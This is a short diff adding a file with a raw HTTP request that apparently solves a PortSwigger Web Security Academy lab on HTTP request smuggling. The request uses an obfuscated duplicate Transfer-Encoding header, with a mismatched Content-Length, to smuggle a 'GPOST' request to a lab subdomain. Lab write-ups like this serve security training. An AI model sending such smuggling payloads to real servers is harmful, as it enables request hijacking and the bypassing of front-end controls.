@@ -1,0 +1,20 @@
+The HTTP request at the bottom of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-encoding: hello
+Content-Length: 4
+
+64
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+
+hello=world
+0
+
+
